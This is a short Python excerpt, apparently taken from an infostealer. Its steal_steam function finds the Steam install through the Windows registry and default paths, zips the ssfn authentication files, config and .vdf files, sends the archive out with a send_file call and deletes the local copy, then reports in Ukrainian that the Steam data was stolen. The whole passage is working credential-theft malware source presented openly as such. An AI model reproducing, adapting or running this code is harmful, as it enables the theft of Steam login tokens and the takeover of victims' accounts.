def steal_steam():
    paths = []
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Valve\Steam")
        steam_path = winreg.QueryValueEx(key, "SteamPath")[0]
        paths.append(steam_path)
    except:
        pass
    default_paths = [
        os.path.expandvars(r"%PROGRAMFILES(x86)%\Steam"),
        os.path.expandvars(r"%LOCALAPPDATA%\Steam")
    ]
    for p in default_paths:
        if os.path.exists(p):
            paths.append(p)
    found = False
    for base in paths:
        if not os.path.exists(base):
            continue
        with zipfile.ZipFile('steam.zip', 'w') as z:
            for file in os.listdir(base):
                if file.startswith('ssfn') or file == 'config' or file.endswith('.vdf'):
                    full = os.path.join(base, file)
                    if os.path.isfile(full):
                        z.write(full, file)
                        found = True
        if found:
            send_file('steam.zip')
            os.remove('steam.zip')
            return "✅ Steam дані вкрадено"
    return "❌ Steam не знайдено"

